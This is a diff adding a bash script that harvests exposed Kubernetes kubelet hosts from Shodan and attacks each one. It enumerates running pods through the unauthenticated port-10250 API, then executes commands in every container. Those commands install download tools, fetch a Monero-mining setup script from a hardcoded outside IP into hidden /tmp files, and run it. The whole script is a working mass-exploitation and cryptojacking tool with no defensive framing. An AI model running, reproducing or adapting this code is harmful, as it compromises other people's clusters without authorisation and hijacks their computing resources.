@@ -1,0 +1,60 @@
+#!/bin/bash
+clear
+echo ''
+echo ''
+
+
+function get_from_shodan(){
+if [ -f "./kubernetes.json.gz" ]; then rm -f ./kubernetes.json.gz 2>/dev/null; fi
+shodan download --limit -1 ./kubernetes 'port:10250 after:20-02-2021 ssl:true 404'  # maybee other is better working ;) :P
+if [ -f "./ips.txt" ]; then rm -f ./ips.txt 2>/dev/null; fi
+shodan parse --fields ip_str ./kubernetes.json.gz >> ./ips.txt
+if [ -f "./kubernetes.json.gz" ]; then rm -f ./kubernetes.json.gz 2>/dev/null; fi
+}
+
+
+function PWN_KUBE(){
+T1OUT="120"
+TEMPFILE="/tmp/"$RANDOM$RANDOM$RANDOM
+theip=$1
+
+timeout -s SIGKILL $T1OUT curl -sk https://$theip:10250/runningpods/ | jq . | grep 'namespace'
+if [ -f $TEMPFILE ]; then rm -f $TEMPFILE; fi
+timeout -s SIGKILL $T1OUT curl -sLk https://$theip:10250/runningpods/ | jq -r '.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name' >> $TEMPFILE
+
+while read namespace podname containername; do
+echo ""
+echo $theip" "$namespace" "$podname" "$containername
+echo ""
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt update --fix-missing"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk update"
+
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y bash"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y wget"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y curl"
+
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y bash"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y wget"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y curl"
+
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add bash"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add wget"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add curl"
+
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget http://45.9.148.35/chimaera/sh/setup_xmr.sh -O /tmp/.x1mr"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl http://45.9.148.35/chimaera/sh/setup_xmr.sh -o /tmp/.x2mr"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x1mr"
+timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x2mr"
+done < $TEMPFILE
+rm -f $TEMPFILE
+}
+
+
+while read FROM_LIST; do 
+PWN_KUBE $FROM_LIST
+done < ./ips.txt
+
+
+exit
+
+
